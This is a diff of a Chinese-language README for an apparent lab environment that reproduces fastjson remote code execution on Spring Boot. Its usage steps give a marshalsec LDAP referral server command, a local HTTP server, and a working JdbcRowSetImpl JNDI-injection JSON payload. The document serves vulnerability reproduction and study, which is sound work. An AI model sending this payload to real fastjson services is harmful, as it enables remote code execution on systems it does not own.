@@ -15,12 +15,16 @@ fastjson rce env based on springboot
   ```
 
 ## 使用步骤
-* java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit 10086 
-* python -m http.server 8081
-* 发送利用payload：{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://127.0.0.1:10086/Object","autoCommit": true}
+1. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit 10086 
+2. python -m http.server 8081
+3. 发送利用payload：{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://127.0.0.1:10086/Object","autoCommit": true}
 
 ## update info
 通过H2 数据库，对数据做了持久化处理，可以保存提交的数据到服务端
 
+## TODO
+- [ ] 分析漏洞源码
+- [ ] 分析补丁情况
+
 ## 参考文章
-* https://mp.weixin.qq.com/s?__biz=MzIyNDcwODgwMA==&mid=2247484165&idx=1&sn=7777807338909931f887108d647d0c32&chksm=e80b92aadf7c1bbc32fb273fe7e18bb4baaccc416d0c1dd7accf31091d4d89fddcb7bd140d2e&token=2026528112&lang=zh_CN#rd
+* https://mp.weixin.qq.com/s/TmltzIJmGqYJZ4q4Rm0V-g
